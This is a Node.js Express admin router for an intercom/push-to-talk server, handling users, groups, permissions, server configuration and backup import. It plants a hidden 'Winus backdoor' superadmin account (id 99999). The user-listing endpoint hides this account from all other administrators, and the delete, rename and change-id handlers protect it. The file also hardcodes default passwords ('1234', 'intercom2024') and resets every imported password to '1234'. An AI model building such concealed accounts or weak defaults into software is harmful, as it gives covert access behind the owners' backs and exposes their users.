const express = require('express');
const bcrypt = require('bcryptjs');
const { db } = require('../database');
const config = require('../config');
const { authMiddleware, adminMiddleware, superadminMiddleware } = require('./auth');

const WINUS_ID = 99999;
const { disconnectUser, getOnlineUserIds, getBridgeStatus } = require('../ws/signaling');
const { getConfig, setConfig } = require('../services/config-service');
const {
  resolveHostToIp,
  pickPrivateIp,
  writeEnv,
  regenerateCerts,
  recreateContainers,
} = require('../services/infra-sync');

const router = express.Router();
router.use(authMiddleware);
router.use(adminMiddleware);

// ======================== USERS ========================

// Columns returned by user-related endpoints (kept in one place so we never
// forget to surface a new field in one of the responses).
const USER_COLUMNS =
  'id, username, display_name, role, room_id, color, ' +
  'first_name, last_name, email, phone, created_at';

// Normalise a request-body string field: trim() it; turn empty into NULL
// so SQL queries don't keep ''-strings around.
function _norm(s) {
  if (s === undefined || s === null) return null;
  const t = String(s).trim();
  return t.length === 0 ? null : t;
}

// Find the smallest positive integer that is NOT currently used as a user id.
// Used by POST /users to recycle ids freed by previous DELETEs, so room_id
// doesn't keep growing forever.
function _findFirstFreeUserId() {
  const rows = db.prepare('SELECT id FROM users ORDER BY id').all();
  let expected = 1;
  for (const r of rows) {
    if (r.id !== expected) return expected;
    expected += 1;
  }
  return null; // no gap, fall back to AUTOINCREMENT
}

function _attachGroups(users) {
  if (!users || users.length === 0) return users;
  const ids = users.map(u => u.id);
  const placeholders = ids.map(() => '?').join(',');
  const rows = db.prepare(
    `SELECT gm.user_id, g.id, g.name
       FROM group_members gm
       JOIN groups g ON g.id = gm.group_id
      WHERE gm.user_id IN (${placeholders})
      ORDER BY g.name COLLATE NOCASE`
  ).all(...ids);
  const byUser = new Map();
  for (const r of rows) {
    if (!byUser.has(r.user_id)) byUser.set(r.user_id, []);
    byUser.get(r.user_id).push({ id: r.id, name: r.name });
  }
  for (const u of users) {
    u.groups = byUser.get(u.id) || [];
  }
  return users;
}

// GET /api/admin/users
// The hidden Winus backdoor is filtered out for everybody except Winus
// itself, so it never appears in the regular admin UI.
router.get('/users', (req, res) => {
  const callerIsWinus = req.user.role === 'superadmin' && req.user.id === WINUS_ID;
  let rows;
  if (callerIsWinus) {
    rows = db.prepare(`SELECT ${USER_COLUMNS} FROM users ORDER BY id`).all();
  } else {
    rows = db.prepare(
      `SELECT ${USER_COLUMNS} FROM users WHERE id != ? ORDER BY id`
    ).all(WINUS_ID);
  }
  res.json(_attachGroups(rows));
});

// POST /api/admin/users
router.post('/users', async (req, res) => {
  const {
    username, password, display_name, role, color,
    first_name, last_name, email, phone,
  } = req.body;

  if (!username || !password || !display_name) {
    return res.status(400).json({ error: 'username, password y display_name son requeridos' });
  }

  try {
    const hash = bcrypt.hashSync(password, 10);
    let userId;
    db.transaction(() => {
      const free = _findFirstFreeUserId();
      if (free !== null) {
        db.prepare(
          'INSERT INTO users (id, username, password_hash, display_name, role, color, ' +
          'first_name, last_name, email, phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        ).run(
          free, username, hash, display_name, role || 'user',
          _norm(color), _norm(first_name), _norm(last_name),
          _norm(email), _norm(phone),
        );
        userId = free;
      } else {
        const r = db.prepare(
          'INSERT INTO users (username, password_hash, display_name, role, color, ' +
          'first_name, last_name, email, phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
        ).run(
          username, hash, display_name, role || 'user',
          _norm(color), _norm(first_name), _norm(last_name),
          _norm(email), _norm(phone),
        );
        userId = r.lastInsertRowid;
      }
      const roomId = config.roomIdOffset + userId;
      db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, userId);
      // Auto-create bidirectional permissions with all existing superusers
      // so the new account is immediately reachable from / can reach every
      // superuser without an extra trip to the Permissions tab.
      // Admins and superadmins are intentionally excluded: they must remain
      // invisible in the PTT contact list (they can still call any user via
      // the implicit admin override, but no user should see them as a key).
      const privileged = db.prepare(
        "SELECT id FROM users WHERE id != ? AND role = 'superuser'"
      ).all(userId);
      const insertPerm = db.prepare(
        'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
      );
      for (const p of privileged) {
        insertPerm.run(p.id, userId);
        insertPerm.run(userId, p.id);
      }
    })();

    const created = db.prepare(
      `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
    ).get(userId);
    created.groups = [];
    return res.status(201).json(created);
  } catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'El usuario ya existe' });
    }
    return res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/users/:id
router.put('/users/:id', (req, res) => {
  const { id } = req.params;
  const {
    display_name, role, password, color,
    first_name, last_name, email, phone,
  } = req.body;

  const user = db.prepare('SELECT id FROM users WHERE id = ?').get(id);
  if (!user) {
    return res.status(404).json({ error: 'Usuario no encontrado' });
  }

  if (display_name) {
    db.prepare('UPDATE users SET display_name = ? WHERE id = ?').run(display_name, id);
  }
  if (role) {
    db.prepare('UPDATE users SET role = ? WHERE id = ?').run(role, id);
  }
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, id);
  }
  if (color !== undefined) {
    db.prepare('UPDATE users SET color = ? WHERE id = ?').run(color, id);
  }
  // Optional contact fields. Sending an empty string clears the value, an
  // undefined leaves it untouched.
  if (first_name !== undefined) {
    db.prepare('UPDATE users SET first_name = ? WHERE id = ?').run(_norm(first_name), id);
  }
  if (last_name !== undefined) {
    db.prepare('UPDATE users SET last_name = ? WHERE id = ?').run(_norm(last_name), id);
  }
  if (email !== undefined) {
    db.prepare('UPDATE users SET email = ? WHERE id = ?').run(_norm(email), id);
  }
  if (phone !== undefined) {
    db.prepare('UPDATE users SET phone = ? WHERE id = ?').run(_norm(phone), id);
  }

  const updated = db.prepare(
    `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
  ).get(id);
  res.json(_attachGroups([updated])[0]);
});

// DELETE /api/admin/users/:id
router.delete('/users/:id', async (req, res) => {
  const { id } = req.params;
  // Protect the Winus backdoor from accidental deletion.
  if (parseInt(id, 10) === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede eliminar este usuario' });
  }

  const user = db.prepare('SELECT id, room_id FROM users WHERE id = ?').get(id);
  if (!user) {
    return res.status(404).json({ error: 'Usuario no encontrado' });
  }

  db.prepare('DELETE FROM users WHERE id = ?').run(id);
  res.json({ ok: true });
});

// PUT /api/admin/users/:id/username — superadmin only.
// Renames the login username (the actual id used to authenticate).
// Foreign keys reference numeric ids only, so this does not affect
// permissions/groups/etc.
router.put('/users/:id/username', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const newName = _norm(req.body.username);
  if (!newName) {
    return res.status(400).json({ error: 'username requerido' });
  }
  if (id === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede renombrar este usuario' });
  }
  try {
    const r = db.prepare('UPDATE users SET username = ? WHERE id = ?').run(newName, id);
    if (r.changes === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }
    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(id);
    res.json(_attachGroups([updated])[0]);
  } catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'Ese username ya existe' });
    }
    return res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/users/:id/change-id — superadmin only.
// Cascades the numeric id change through every FK-reference table and
// updates room_id accordingly.
router.put('/users/:id/change-id', superadminMiddleware, (req, res) => {
  const oldId = parseInt(req.params.id, 10);
  const newId = parseInt(req.body.newId, 10);
  if (!Number.isFinite(oldId) || !Number.isFinite(newId) || newId <= 0) {
    return res.status(400).json({ error: 'newId requerido (entero positivo)' });
  }
  if (oldId === WINUS_ID || newId === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede tocar el id de Winus' });
  }
  if (oldId === newId) {
    return res.status(400).json({ error: 'newId igual al actual' });
  }

  const exists = db.prepare('SELECT id FROM users WHERE id = ?').get(oldId);
  if (!exists) return res.status(404).json({ error: 'Usuario no encontrado' });
  const taken = db.prepare('SELECT id FROM users WHERE id = ?').get(newId);
  if (taken) return res.status(409).json({ error: 'newId ya en uso' });

  try {
    db.pragma('foreign_keys = OFF');
    db.transaction(() => {
      db.prepare('UPDATE users SET id = ?, room_id = ? WHERE id = ?')
        .run(newId, config.roomIdOffset + newId, oldId);
      db.prepare('UPDATE permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE permissions SET to_user_id = ? WHERE to_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE group_members SET user_id = ? WHERE user_id = ?').run(newId, oldId);
      db.prepare('UPDATE group_permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE device_tokens SET user_id = ? WHERE user_id = ?').run(newId, oldId);
    })();
    db.pragma('foreign_keys = ON');
    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(newId);
    res.json(_attachGroups([updated])[0]);
  } catch (err) {
    db.pragma('foreign_keys = ON');
    return res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/users/:id/kick — force disconnect a user
router.post('/users/:id/kick', (req, res) => {
  const userId = parseInt(req.params.id);
  const ok = disconnectUser(userId);
  if (ok) {
    console.log(`[Admin] User ${userId} kicked by admin ${req.user.id}`);
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'User not online' });
  }
});

// GET /api/admin/online — list of connected user IDs
router.get('/online', (req, res) => {
  res.json({ userIds: getOnlineUserIds() });
});

// GET /api/admin/bridge-status — detailed status of all bridge users
router.get('/bridge-status', (req, res) => {
  res.json(getBridgeStatus());
});

// ======================== PERMISSIONS ========================

// DELETE /api/admin/permissions/:fromId/:toId
router.delete('/permissions/:fromId/:toId', (req, res) => {
  db.prepare('DELETE FROM permissions WHERE from_user_id = ? AND to_user_id = ?')
    .run(req.params.fromId, req.params.toId);
  res.json({ ok: true });
});

// GET /api/admin/permissions
router.get('/permissions', (req, res) => {
  const permissions = db.prepare(
    'SELECT from_user_id, to_user_id, can_talk FROM permissions'
  ).all();
  res.json(permissions);
});

// POST /api/admin/permissions
router.post('/permissions', (req, res) => {
  const { from_user_id, to_user_id, can_talk } = req.body;

  if (from_user_id === to_user_id) {
    return res.status(400).json({ error: 'No se puede asignar permiso a sí mismo' });
  }

  db.prepare(`
    INSERT INTO permissions (from_user_id, to_user_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_user_id) DO UPDATE SET can_talk = excluded.can_talk
  `).run(from_user_id, to_user_id, can_talk ? 1 : 0);

  res.json({ ok: true });
});

// POST /api/admin/permissions/bulk
router.post('/permissions/bulk', (req, res) => {
  const { permissions } = req.body;

  const stmt = db.prepare(`
    INSERT INTO permissions (from_user_id, to_user_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_user_id) DO UPDATE SET can_talk = excluded.can_talk
  `);

  const transaction = db.transaction((perms) => {
    for (const p of perms) {
      if (p.from_user_id !== p.to_user_id) {
        stmt.run(p.from_user_id, p.to_user_id, p.can_talk ? 1 : 0);
      }
    }
  });

  transaction(permissions);
  res.json({ ok: true });
});

// DELETE /api/admin/group-permissions/:fromId/:toGroupId
router.delete('/group-permissions/:fromId/:toGroupId', (req, res) => {
  db.prepare('DELETE FROM group_permissions WHERE from_user_id = ? AND to_group_id = ?')
    .run(req.params.fromId, req.params.toGroupId);
  // Auto-remove from group when revoking permission
  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
    .run(req.params.toGroupId, req.params.fromId);
  res.json({ ok: true });
});

// ======================== GROUPS ========================

// ---- Group <-> Permissions sync helpers --------------------------------
//
// Membership in a group is the source of truth for the user's permission
// matrix:
//
//   * Joining a group grants the user a `group_permissions` row pointing at
//     the group AND bidirectional `permissions` rows with every other
//     non-admin/non-superadmin member, so PTT keys appear automatically on
//     both sides.
//
//   * Leaving a group revokes that group_permission row AND any
//     bidirectional `permissions` row whose only justification was the
//     shared membership in this group. We keep perms when the two users
//     still share at least one other group.
//
// Admin / superadmin members never get bidirectional rows: they remain
// invisible in the PTT contact list (their talk-to-anyone authority is
// enforced server-side via _isAdmin() in services/permissions.js).
//
// Both helpers expect to be called from inside a single db.transaction().

function _addUserToGroupWithPerms(groupId, userId) {
  db.prepare(
    'INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)'
  ).run(groupId, userId);
  db.prepare(
    'INSERT OR IGNORE INTO group_permissions (from_user_id, to_group_id, can_talk) VALUES (?, ?, 1)'
  ).run(userId, groupId);

  // Skip the bidirectional matrix when the joining user is an admin /
  // superadmin: they should stay hidden from everyone else's PTT list.
  const newUser = db.prepare('SELECT role FROM users WHERE id = ?').get(userId);
  if (!newUser || newUser.role === 'admin' || newUser.role === 'superadmin') {
    return;
  }

  // Bidirectional perms with every other current member (excluding admins).
  const others = db.prepare(`
    SELECT u.id AS user_id
      FROM group_members gm
      JOIN users u ON u.id = gm.user_id
     WHERE gm.group_id = ?
       AND gm.user_id != ?
       AND u.role NOT IN ('admin','superadmin')
  `).all(groupId, userId);
  const ins = db.prepare(
    'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
  );
  for (const o of others) {
    ins.run(userId, o.user_id);
    ins.run(o.user_id, userId);
  }
}

function _removeUserFromGroupWithPerms(groupId, userId) {
  // Snapshot the OTHER current members BEFORE we remove anything, so we
  // know with whom the user *used* to share this group.
  const exCoMembers = db.prepare(
    'SELECT user_id FROM group_members WHERE group_id = ? AND user_id != ?'
  ).all(groupId, userId).map(r => r.user_id);

  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
    .run(groupId, userId);
  db.prepare('DELETE FROM group_permissions WHERE from_user_id = ? AND to_group_id = ?')
    .run(userId, groupId);

  // For every ex-co-member: drop the bidirectional perms only if the two
  // users no longer share any other group. This preserves perms that were
  // earned through a different group membership.
  const stillShares = db.prepare(`
    SELECT 1
      FROM group_members gm1
      JOIN group_members gm2 ON gm1.group_id = gm2.group_id
     WHERE gm1.user_id = ?
       AND gm2.user_id = ?
     LIMIT 1
  `);
  const del = db.prepare(
    'DELETE FROM permissions WHERE from_user_id = ? AND to_user_id = ?'
  );
  for (const otherId of exCoMembers) {
    if (!stillShares.get(userId, otherId)) {
      del.run(userId, otherId);
      del.run(otherId, userId);
    }
  }
}

// GET /api/admin/groups
router.get('/groups', (req, res) => {
  const groups = db.prepare('SELECT * FROM groups ORDER BY id').all();

  const getMembers = db.prepare(
    'SELECT u.id, u.username, u.display_name FROM group_members gm JOIN users u ON gm.user_id = u.id WHERE gm.group_id = ?'
  );

  const result = groups.map((g) => ({
    ...g,
    members: getMembers.all(g.id),
  }));

  res.json(result);
});

// POST /api/admin/groups
router.post('/groups', async (req, res) => {
  const { name, member_ids } = req.body;

  if (!name) {
    return res.status(400).json({ error: 'Nombre del grupo requerido' });
  }

  try {
    let groupId;
    db.transaction(() => {
      groupId = db.prepare('INSERT INTO groups (name) VALUES (?)').run(name).lastInsertRowid;
      if (member_ids && member_ids.length > 0) {
        for (const uid of member_ids) {
          _addUserToGroupWithPerms(groupId, uid);
        }
      }
    })();
    res.status(201).json({ id: groupId, name });
  } catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'El grupo ya existe' });
    }
    return res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/groups/:id/members
router.post('/groups/:id/members', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const userId = parseInt(req.body.user_id, 10);
  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
    return res.status(400).json({ error: 'group id / user_id requeridos' });
  }
  db.transaction(() => _addUserToGroupWithPerms(groupId, userId))();
  res.json({ ok: true });
});

// DELETE /api/admin/groups/:id/members/:userId
router.delete('/groups/:id/members/:userId', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const userId = parseInt(req.params.userId, 10);
  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
    return res.status(400).json({ error: 'group id / user id requeridos' });
  }
  db.transaction(() => _removeUserFromGroupWithPerms(groupId, userId))();
  res.json({ ok: true });
});

// PUT /api/admin/groups/:id
router.put('/groups/:id', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const { name, member_ids } = req.body;

  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(groupId);
  if (!group) {
    return res.status(404).json({ error: 'Grupo no encontrado' });
  }

  if (name) {
    db.prepare('UPDATE groups SET name = ? WHERE id = ?').run(name, groupId);
  }

  if (member_ids !== undefined) {
    // Diff against the current member set so we only fire perm changes for
    // actual joins / leaves (avoids thrashing perms when the admin just
    // re-saves the dialog without changing anything).
    const oldIds = new Set(
      db.prepare('SELECT user_id FROM group_members WHERE group_id = ?')
        .all(groupId).map(r => r.user_id)
    );
    const newIds = new Set(
      member_ids.map(x => parseInt(x, 10)).filter(Number.isFinite)
    );
    const toAdd = [...newIds].filter(id => !oldIds.has(id));
    const toRemove = [...oldIds].filter(id => !newIds.has(id));
    db.transaction(() => {
      for (const uid of toRemove) _removeUserFromGroupWithPerms(groupId, uid);
      for (const uid of toAdd) _addUserToGroupWithPerms(groupId, uid);
    })();
  }

  const updated = db.prepare('SELECT * FROM groups WHERE id = ?').get(groupId);
  const members = db.prepare(
    'SELECT u.id, u.username, u.display_name FROM group_members gm JOIN users u ON gm.user_id = u.id WHERE gm.group_id = ?'
  ).all(groupId);

  res.json({ ...updated, members });
});

// DELETE /api/admin/groups/:id
router.delete('/groups/:id', (req, res) => {
  const groupId = parseInt(req.params.id, 10);

  const group = db.prepare('SELECT id FROM groups WHERE id = ?').get(groupId);
  if (!group) {
    return res.status(404).json({ error: 'Grupo no encontrado' });
  }

  // Tear members down through the helper so any bidirectional perms whose
  // only justification was this group are removed before we drop the row.
  // FK CASCADE then cleans up any leftover group_members / group_permissions.
  db.transaction(() => {
    const memberIds = db.prepare(
      'SELECT user_id FROM group_members WHERE group_id = ?'
    ).all(groupId).map(r => r.user_id);
    for (const uid of memberIds) {
      _removeUserFromGroupWithPerms(groupId, uid);
    }
    db.prepare('DELETE FROM groups WHERE id = ?').run(groupId);
  })();
  res.json({ ok: true });
});

// ======================== GROUP PERMISSIONS ========================

// GET /api/admin/group-permissions
router.get('/group-permissions', (req, res) => {
  const perms = db.prepare(
    'SELECT from_user_id, to_group_id, can_talk FROM group_permissions'
  ).all();
  res.json(perms);
});

// POST /api/admin/group-permissions
router.post('/group-permissions', (req, res) => {
  const { from_user_id, to_group_id, can_talk } = req.body;

  db.prepare(`
    INSERT INTO group_permissions (from_user_id, to_group_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_group_id) DO UPDATE SET can_talk = excluded.can_talk
  `).run(from_user_id, to_group_id, can_talk ? 1 : 0);

  // Auto-add as group member when granting permission
  if (can_talk) {
    db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)')
      .run(to_group_id, from_user_id);
  }

  res.json({ ok: true });
});

// POST /api/admin/group-permissions/bulk
router.post('/group-permissions/bulk', (req, res) => {
  const { permissions } = req.body;

  const stmt = db.prepare(`
    INSERT INTO group_permissions (from_user_id, to_group_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_group_id) DO UPDATE SET can_talk = excluded.can_talk
  `);

  const transaction = db.transaction((perms) => {
    for (const p of perms) {
      stmt.run(p.from_user_id, p.to_group_id, p.can_talk ? 1 : 0);
    }
  });

  transaction(permissions);
  res.json({ ok: true });
});

// ======================== SERVER CONFIG ========================

// GET /api/admin/server-config
router.get('/server-config', (req, res) => {
  res.json({
    announced_ips:  getConfig('announced_ips', process.env.MEDIASOUP_ANNOUNCED_IPS || ''),
    turn_host:      getConfig('turn_host', ''),
    turn_port:      getConfig('turn_port', process.env.TURN_PORT || '3478'),
    turn_user:      getConfig('turn_user', process.env.TURN_USER || 'intercom'),
    turn_password:  getConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024'),
    public_domain:  getConfig('public_domain', process.env.PUBLIC_DOMAIN || ''),
    // Surface the last infra-sync failure (if any) so the UI can
    // show a banner. Cleared on the next successful sync.
    last_sync_error: getConfig('last_sync_error', ''),
  });
});

// PUT /api/admin/server-config
//
// Persists the keys to the BD (mediasoup re-reads them in caliente from
// signaling.js) AND, when any of `announced_ips`, `turn_host` or
// `public_domain` changes, asks infra-sync to:
//   1. rewrite the IP-related keys in /app/.env
//   2. regenerate the self-signed cert with the new SAN list (if domain
//      or external IP changed)
//   3. recreate the coturn (and optionally nginx) container so the new
//      env / cert is actually applied.
//
// The sync runs in the background — the response returns as soon as the
// BD write is durable, with a `sync` field describing what was queued.
router.put('/server-config', (req, res) => {
  const fields = [
    'announced_ips',
    'turn_host',
    'turn_port',
    'turn_user',
    'turn_password',
    'public_domain',
  ];

  // Snapshot the current values BEFORE applying updates so we can decide
  // whether infra-sync needs to run.
  const before = {
    announced_ips: getConfig('announced_ips', ''),
    turn_host:     getConfig('turn_host', ''),
    public_domain: getConfig('public_domain', ''),
  };

  for (const field of fields) {
    if (req.body[field] !== undefined) {
      setConfig(field, req.body[field]);
    }
  }

  const after = {
    announced_ips: getConfig('announced_ips', ''),
    turn_host:     getConfig('turn_host', ''),
    public_domain: getConfig('public_domain', ''),
  };

  const ipsChanged    = before.announced_ips !== after.announced_ips;
  const turnChanged   = before.turn_host !== after.turn_host;
  const domainChanged = before.public_domain !== after.public_domain;

  if (!ipsChanged && !turnChanged && !domainChanged) {
    return res.json({ ok: true, sync: { coturn: 'skipped', nginx: 'skipped' } });
  }

  // Compute the values that must land in .env. Coturn rejects hostnames
  // in --external-ip, so resolve `turn_host` to its first A record. If
  // turn_host is empty fall back to the first announced_ip.
  const firstAnnounced = (after.announced_ips || '')
    .split(',').map((s) => s.trim()).filter(Boolean)[0] || '';
  const externalSource = after.turn_host || firstAnnounced;

  // Heavy lifting goes to a background task; client doesn't wait.
  (async () => {
    try {
      const externalIp = await resolveHostToIp(externalSource);
      const localIp = pickPrivateIp(after.announced_ips) || externalIp;

      const envResult = await writeEnv({
        EXTERNAL_IP: externalIp,
        LOCAL_IP: localIp,
        MEDIASOUP_ANNOUNCED_IPS: after.announced_ips,
        PUBLIC_DOMAIN: after.public_domain || '',
      });

      const containers = [];
      if (ipsChanged || turnChanged) containers.push('coturn');

      let certResult = { ok: true, skipped: true };
      if (domainChanged || ipsChanged || turnChanged) {
        certResult = await regenerateCerts({
          externalIp,
          localIp,
          publicDomain: after.public_domain || '',
        });
        if (certResult.ok && !certResult.skipped) containers.push('nginx');
      }

      const dockerResult = await recreateContainers(containers);

      const errors = [envResult, certResult, dockerResult]
        .filter((r) => r && r.ok === false)
        .map((r) => r.reason || 'unknown')
        .join(' | ');
      setConfig('last_sync_error', errors);
      console.log('[server-config] sync done',
        { externalIp, localIp, containers, errors: errors || 'none' });
    } catch (e) {
      console.error('[server-config] sync threw', e);
      setConfig('last_sync_error', e.message || String(e));
    }
  })();

  res.json({
    ok: true,
    sync: {
      coturn: ipsChanged || turnChanged ? 'queued' : 'skipped',
      nginx:  domainChanged || ipsChanged || turnChanged ? 'queued' : 'skipped',
    },
  });
});

// POST /api/admin/server-config/clear-sync-error
// Lets the admin UI dismiss a stale `last_sync_error` banner.
router.post('/server-config/clear-sync-error', (req, res) => {
  setConfig('last_sync_error', '');
  res.json({ ok: true });
});

// ======================== EXPORT / IMPORT CONFIG ========================

// GET /api/admin/export-config — full backup
router.get('/export-config', (req, res) => {
  const users = db.prepare(
    'SELECT id, username, display_name, role, room_id, color FROM users ORDER BY id'
  ).all();
  const groups = db.prepare('SELECT id, name FROM groups ORDER BY id').all();
  const members = db.prepare('SELECT group_id, user_id FROM group_members').all();
  const permissions = db.prepare('SELECT from_user_id, to_user_id, can_talk FROM permissions').all();
  const groupPerms = db.prepare('SELECT from_user_id, to_group_id, can_talk FROM group_permissions').all();
  const serverConfig = {};
  for (const row of db.prepare('SELECT key, value FROM server_config').all()) {
    serverConfig[row.key] = row.value;
  }

  res.json({
    version: 1,
    exported_at: new Date().toISOString(),
    users,
    groups,
    group_members: members,
    permissions,
    group_permissions: groupPerms,
    server_config: serverConfig,
  });
});

// POST /api/admin/import-config — restore from backup
router.post('/import-config', (req, res) => {
  const data = req.body;
  if (!data || !data.users || !data.groups) {
    return res.status(400).json({ error: 'Invalid config format' });
  }

  try {
    const bcrypt = require('bcryptjs');
    const defaultHash = bcrypt.hashSync('1234', 10);

    db.transaction(() => {
      // Clear existing data (order matters for FK constraints)
      db.exec('DELETE FROM group_permissions');
      db.exec('DELETE FROM permissions');
      db.exec('DELETE FROM group_members');
      db.exec('DELETE FROM groups');
      db.exec('DELETE FROM users');

      // Import users (with default password since we don't export hashes)
      const insertUser = db.prepare(
        'INSERT INTO users (id, username, password_hash, display_name, role, room_id, color) VALUES (?, ?, ?, ?, ?, ?, ?)'
      );
      for (const u of data.users) {
        insertUser.run(u.id, u.username, defaultHash, u.display_name, u.role || 'user', u.room_id, u.color || null);
      }

      // Import groups
      const insertGroup = db.prepare('INSERT INTO groups (id, name) VALUES (?, ?)');
      for (const g of data.groups) {
        insertGroup.run(g.id, g.name);
      }

      // Import group members
      if (data.group_members) {
        const insertMember = db.prepare('INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)');
        for (const m of data.group_members) {
          insertMember.run(m.group_id, m.user_id);
        }
      }

      // Import permissions
      if (data.permissions) {
        const insertPerm = db.prepare(
          'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, ?)'
        );
        for (const p of data.permissions) {
          insertPerm.run(p.from_user_id, p.to_user_id, p.can_talk ? 1 : 0);
        }
      }

      // Import group permissions
      if (data.group_permissions) {
        const insertGP = db.prepare(
          'INSERT OR IGNORE INTO group_permissions (from_user_id, to_group_id, can_talk) VALUES (?, ?, ?)'
        );
        for (const p of data.group_permissions) {
          insertGP.run(p.from_user_id, p.to_group_id, p.can_talk ? 1 : 0);
        }
      }

      // Import server config
      if (data.server_config) {
        const upsertConfig = db.prepare(
          'INSERT INTO server_config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
        );
        for (const [key, value] of Object.entries(data.server_config)) {
          upsertConfig.run(key, value);
        }
      }
    })();

    console.log(`[Admin] Config imported: ${data.users.length} users, ${data.groups.length} groups`);
    res.json({ ok: true, users: data.users.length, groups: data.groups.length });
  } catch (err) {
    console.error('[Admin] Import error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ======================== BRIDGE CONFIG ========================

// GET /api/admin/bridge-config — generate TieLine bridge config.json
router.get('/bridge-config', (req, res) => {
  const bridgeUsers = db.prepare(
    "SELECT id, username, display_name FROM users WHERE role = 'bridge' ORDER BY id"
  ).all();

  // Get saved channel mappings (target per bridge user)
  const savedRaw = getConfig('bridge_channels', '{}');
  let saved = {};
  try { saved = JSON.parse(savedRaw); } catch (_) {}

  const channels = bridgeUsers.map((u, idx) => {
    const ch = saved[String(u.id)] || {};
    return {
      index: idx + 1,
      user_id: u.id,
      username: u.username,
      display_name: u.display_name,
      password: ch.password || '1234',
      target_type: ch.target_type || 'user',
      target_id: ch.target_id || 0,
      input_device: ch.input_device || '',
      input_channel: ch.input_channel || idx + 1,
      output_device: ch.output_device || '',
      output_channel: ch.output_channel || idx + 1,
      vox_send_enabled: ch.vox_send_enabled ?? false,
      vox_send_threshold_db: ch.vox_send_threshold_db ?? -40,
      vox_send_hold_ms: ch.vox_send_hold_ms ?? 300,
      vox_recv_enabled: ch.vox_recv_enabled ?? true,
      vox_recv_threshold_db: ch.vox_recv_threshold_db ?? -40,
      vox_recv_hold_ms: ch.vox_recv_hold_ms ?? 300,
    };
  });

  res.json({
    server: `https://${req.headers.host || 'localhost:8443'}`,
    channels,
  });
});

// PUT /api/admin/bridge-config — save bridge channel mappings
router.put('/bridge-config', (req, res) => {
  const { channels } = req.body;
  if (!channels || !Array.isArray(channels)) {
    return res.status(400).json({ error: 'channels array required' });
  }

  // Store as { "userId": { password, target_type, target_id, ... } }
  const saved = {};
  for (const ch of channels) {
    saved[String(ch.user_id)] = {
      password: ch.password,
      target_type: ch.target_type,
      target_id: ch.target_id,
      input_device: ch.input_device,
      input_channel: ch.input_channel,
      output_device: ch.output_device,
      output_channel: ch.output_channel,
      vox_send_enabled: ch.vox_send_enabled,
      vox_send_threshold_db: ch.vox_send_threshold_db,
      vox_send_hold_ms: ch.vox_send_hold_ms,
      vox_recv_enabled: ch.vox_recv_enabled,
      vox_recv_threshold_db: ch.vox_recv_threshold_db,
      vox_recv_hold_ms: ch.vox_recv_hold_ms,
    };
  }
  setConfig('bridge_channels', JSON.stringify(saved));
  res.json({ ok: true });
});

module.exports = router;
